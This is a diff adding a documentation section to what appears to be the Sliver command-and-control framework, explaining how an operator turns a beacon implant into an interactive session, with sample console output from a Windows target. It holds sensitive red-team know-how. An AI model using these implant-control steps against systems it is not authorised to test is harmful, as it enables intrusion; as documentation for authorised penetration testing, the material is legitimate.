@@ -201,6 +201,24 @@ You can view previous tasks execute by the active beacon using the `tasks` comma
 
 You can get the old output from the task using `tasks fetch` and selecting the task you want to see the output from. Note that in this case these task output is stored on the server, so operators in multiplayer mode can fetch output from tasks issued by other operators. However, operators will only see the automatic results from tasks that they executed. You can disable the automatic display of task results using the `settings` command.
 
+#### Switching from Beacon Mode to Session Mode
+
+You can use the `interactive` command to task a beacon to open an interactive session, with no arguments the current C2 channel will be used:
+
+```
+[server] sliver (RELATIVE_ADVERTISEMENT) > interactive 
+
+[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
+[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)
+
+[*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
+```
+
+__⚠️ IMPORTANT:__ You can only open interactive sessions over C2 protocols that were compiled into the binary. For example, if you did not initially compile an implant with `--http` you won't be able to open an interactive session over HTTP.
+
+When you're done using the interactive session use the `close` command to close the interactive session without killing the implant. Note that the beacon will still perform check-ins while an interactive session is open.
+
+
 ## Multiple Domains/Protocols
 
 You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protocols first (MTLS -> WG -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.
